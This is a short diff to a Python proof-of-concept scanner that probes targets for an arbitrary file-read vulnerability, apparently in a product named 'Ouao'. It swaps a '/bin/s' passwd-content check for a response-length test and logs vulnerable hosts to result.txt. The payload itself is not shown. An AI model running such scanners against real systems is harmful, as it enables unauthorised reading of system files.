@@ -20,7 +20,7 @@ def poc(target):
         re1=requests.get(url=target,timeout=5,verify=False)
         if re1.status_code==200:
             re2 = requests.get(url=target+payload,timeout=5,verify=False)
-            if '/bin/s' in re2.text:    #判断响应包是否符合
+            if len(re2.text)>5000:    #判断响应包是否符合
                 print(f'[+]{target}存在文件读取漏洞')
                 with open('result.txt','a',encoding='utf-8') as f:
                     f.write('欧澳文件读取'+target+'\n')
@@ -55,4 +55,5 @@ def main():
             
     
 if __name__=='__main__':
+
     main()
